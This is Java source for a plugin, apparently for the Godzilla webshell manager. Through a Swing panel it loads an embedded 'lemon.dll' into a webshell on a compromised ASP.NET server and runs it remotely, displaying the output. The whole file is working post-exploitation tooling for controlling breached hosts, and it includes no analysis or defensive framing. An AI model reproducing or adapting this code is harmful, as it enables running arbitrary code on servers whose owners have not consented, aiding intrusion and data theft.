package shells.plugins.cshap;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(Name = "lemon", payloadName = "CShapDynamicPayload")
public class ShapWeb implements Plugin {
    private static final String CLASS_NAME = "lemon.Run";
    private Encoding encoding;
    private JButton loadButton = new JButton("Load");
    private boolean loadState;
    private JPanel panel = new JPanel(new BorderLayout());
    private Payload payload;
    private RTextArea resultTextArea = new RTextArea();
    private JButton runButton = new JButton("Run");
    private ShellEntity shellEntity;
    private JSplitPane splitPane = new JSplitPane();

    public ShapWeb() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.loadButton);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
             

            public void componentResized(ComponentEvent e) {
                ShapWeb.this.splitPane.setDividerLocation(0.15d);
            }
        });
        this.panel.add(this.splitPane);
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("shell/asp/assets/lemon.dll");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    JOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
                    return;
                }
                JOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
            } catch (Exception e) {
                Log.error(e);
                JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
            }
        } else {
            JOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
        }
    }

    private void runButtonClick(ActionEvent actionEvent) {
        this.resultTextArea.setText(this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "run", new ReqParameter())));
    }

    @Override 
    public void init(ShellEntity shellEntity2) {
        this.shellEntity = shellEntity2;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override 
    public JPanel getView() {
        return this.panel;
    }
}
